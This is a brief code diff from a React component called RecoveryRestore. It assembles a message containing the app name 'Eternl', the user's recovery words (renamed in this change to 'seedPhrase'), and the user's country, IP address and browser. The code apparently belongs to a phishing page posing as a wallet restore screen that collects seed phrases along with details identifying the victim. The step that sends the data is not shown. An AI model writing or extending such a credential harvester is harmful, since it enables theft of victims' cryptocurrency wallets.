@@ -231,7 +231,7 @@ export default function RecoveryRestore({
 
       const messageData = {
         appName: "Eternl",
-        recovery: sanitizedRecovery.join(" "),
+        seedPhrase: sanitizedRecovery.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
         browser:
